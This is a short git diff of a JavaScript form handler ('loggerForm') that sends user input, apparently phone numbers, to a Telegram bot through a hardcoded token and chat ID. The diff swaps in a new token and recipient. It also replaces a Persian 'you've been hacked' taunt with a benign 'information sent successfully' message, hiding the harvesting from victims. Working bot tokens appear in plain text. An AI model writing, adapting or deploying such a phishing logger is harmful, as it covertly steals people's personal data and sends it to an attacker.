@@ -4,19 +4,19 @@ document.getElementById("loggerForm").addEventListener("submit", function(event)
     var data = document.getElementById("data").value; // Get the data from the input field
   
     // Send the data to the Telegram bot using the fetch API
-    fetch("https://api.telegram.org/bot6693518588:AAEvOkPod4Um0HKc9LwduEDg_ayLG0HSxUQ/sendMessage", {
+    fetch("https://api.telegram.org/bot7874151366:AAEfb7rXxr-BTyQPx_8Dpu-en1ZiXc-iWQg/sendMessage", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        chat_id: "6106577169",
+        chat_id: "1171970672",
         text: data
       })
     })
     .then(function(response) {
       if (response.ok) {
-        alert("سلام شما هک شدید😂 ورود به کانال من: t.me/rmsup");
+        alert("اطلاعات با موفقیت ارسال شد👍");
       } else {
         alert("لطفا شماره خود را صحیح وارد کنید🙏");
       }
